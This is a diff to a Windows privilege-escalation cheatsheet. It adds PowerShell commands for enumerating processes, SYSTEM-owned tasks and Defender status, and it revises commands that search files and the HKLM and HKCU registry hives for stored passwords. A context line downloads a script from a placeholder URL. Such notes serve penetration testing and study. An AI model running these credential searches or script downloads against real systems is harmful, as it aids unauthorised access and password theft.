@@ -1,9 +1,30 @@
 # Windows Privilege Escalation Cheatsheet
 
-## List powershell module directories
+## Information gathering
+
+### Powershell informations
 
 ```powershell
 echo $Env:PSModulePath
+Get-ExecutionPolicy
+```
+
+### Processes and owners
+
+```powershell
+Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+```
+
+### Processes running as system
+
+```powershell
+tasklist /v /fi "username eq system"
+```
+
+### Windows Defender status
+
+```powershell
+Get-MpComputerStatus
 ```
 
 ## Download file
@@ -14,20 +35,16 @@ Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1
 
 ## Search for passwords in filesystem
 
-```shell
-cmd style: dir /s *pass* == *cred* == *vnc* == *.config*
+```powershell
+findstr /si password *.xml *.ini *.txt *.config
 ```
 
 ```powershell
-powershell style: findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s /k
 ```
 
 ```powershell
-reg query HKLM /f password /t REG_SZ /s
-```
-
-```powershell
-reg query HKCU /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s /k
 ```
 
 ## MSI register
